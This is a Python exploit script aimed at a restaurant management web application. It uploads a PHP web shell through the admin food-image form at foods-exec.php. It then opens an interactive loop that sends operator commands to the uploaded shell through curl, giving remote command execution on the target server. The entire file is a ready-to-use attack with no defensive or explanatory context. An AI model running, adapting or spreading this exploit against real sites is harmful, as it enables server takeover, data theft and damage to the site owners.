#!/usr/bin/python

import requests
import sys

print("\n\t\t>>>- cOdEd By: Venexy | Telegram: @MaxiiKimii -<<<\n")
if len(sys.argv) != 2:
    print("[+] Usage : python exploit.py http://target.com/")
    exit()

url = sys.argv[1]
#ip = sys.argv[2]
#port = sys.argv[3]

if len(sys.argv[1]) < 8:
    print("[+] Usage : python exploit.py rce http://target.com/")
    exit()

print("[+] Restaurant Management System Exploit, Uploading Shell")

target = url + "admin/foods-exec.php"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data;boundary=---------------------------191691572411478",
    "Connection": "close",
    "Referer": "http://localhost:8081/rms/admin/foods.php",
    "Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
    "Upgrade-Insecure-Requests": "1"
}

data = """
-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="exploit.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""

r = requests.post(target, verify=False, headers=headers, data=data)

print("[+] Shell Uploaded. Please check the URL: " + url + "images/exploit.php")

import subprocess

while True:
    command = input("RCE Command (or 'exit' to quit): ")

    if command.lower() == 'exit':
        break

    execute_shell_command = f"curl -s '{url}images/exploit.php?cmd={command}'"
    execute_shell_process = subprocess.Popen(execute_shell_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = execute_shell_process.communicate()

    print("Command Output:")
    print(output.decode())
    if error:
        print("Error:")
        print(error.decode())

print("[+] Exiting the interactive shell.")
